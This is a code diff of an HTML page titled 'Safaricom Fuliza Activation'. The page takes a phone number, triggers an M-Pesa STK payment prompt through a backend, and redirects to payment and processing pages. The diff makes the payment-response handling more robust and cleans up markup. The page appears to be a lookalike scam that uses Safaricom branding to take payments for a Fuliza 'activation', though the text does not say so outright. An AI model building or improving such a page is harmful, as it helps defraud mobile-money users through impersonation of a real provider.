@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Safaricom Fuliza Activation</title>
     <style>
         :root {
@@ -226,7 +226,7 @@
         <label class="input-label">Safaricom Phone Number</label>
         <div class="phone-input-container">
             <div class="country-prefix">254</div>
-            <input type="tel" id="phone_num" class="phone-field" placeholder="7XXXXXXXX" maxlength="10">
+            <input type="tel" id="phone_num" class="phone-field" placeholder="7XXXXXXXX" maxlength="10" />
         </div>
         <div id="phone-error" class="error-alert">Invalid format. Must be 07xxxxxxxx or 01xxxxxxxx</div>
         <div class="sub-instruction" id="inputHint">Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)</div>
@@ -312,41 +312,43 @@
 
             const data = await response.json();
 
-            if (response.ok && data.success === true) {
-                
-                // CASE 1: The user somehow finished within 5s (Synchronous Completed Response)
-                if (data.status === "completed") {
+            if (response.ok) {
+                // 1. Safely extract checkout_request_id from root OR nested data object
+                const checkoutId = data.checkout_request_id || 
+                                   (data.data && data.data.checkout_request_id) || 
+                                   (data.data && data.data.CheckoutRequestID);
+                // 2. Normalize status to lowercase to avoid casing mismatches ("Pending" vs "pending")
+                const currentStatus = (data.status || "").toLowerCase();
+
+                // CASE 1: Instant completion
+                if (currentStatus === "completed" || currentStatus === "success") {
                     statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
                     statusText.style.color = "var(--safaricom-green)";
                     subStatusText.style.display = "none";
-                    setTimeout(() => { 
-                        window.location.href = "payment2.html"; 
+                    setTimeout(() => {
+                        window.location.href = "payment2.html";
                     }, 2000);
-                } 
-                
-                // CASE 2: Normal scenario: STK prompt is sent (Asynchronous Pending Response)
-                else if (data.status === "pending") {
-                    const checkoutId = data.checkout_request_id;
-                    
+                }
+                // CASE 2: Normal STK push sent scenario
+                else if (currentStatus === "pending" || checkoutId) {
                     if (!checkoutId) {
-                        throw new Error("Missing transaction tracking reference from gateway.");
+                        throw new Error("Missing transaction tracking request ID");
                     }
-                    
-                    // SAVE IT TO LOCAL STORAGE FOR THE PROCESSING PAGE
+
                     localStorage.setItem("request_id", checkoutId);
-                    
+
                     statusText.innerText = "PROMPT SENT! REDIRECTING...";
                     statusText.style.color = "var(--safaricom-green)";
-                    subStatusText.innerText = "Preparing secure tracking window...";
+                    subStatusText.innerText = "Preparing secure tracking...";
 
-                    // Immediately push execution over to your polling loading page
-                    setTimeout(() => { 
-                        window.location.href = "processing.html"; 
+                    setTimeout(() => {
+                        window.location.href = "processing.html";
                     }, 1500);
+                } else {
+                    throw new Error(data.message || "Unrecognized payment response.");
                 }
-
             } else {
-                // Catches explicit API failures (e.g., Image Item #3: Insufficient balance)
+                // Handle explicit API failures
                 throw new Error(data.message || "Invalid response structure from backend gateway.");
             }
         } catch (error) {
@@ -354,8 +356,7 @@
             statusText.innerText = "ERROR: " + error.message;
             statusText.style.color = "var(--error-red)";
             subStatusText.style.display = "none";
-            
-            // Wait 3 seconds, close the modal view overlay, staying on payment1.html safely
+            // Wait 3 seconds, close the modal view overlay
             setTimeout(() => { 
                 modal.style.display = "none"; 
             }, 3000);
@@ -364,4 +365,4 @@
 </script>
 
 </body>
-                </html>
+</html>
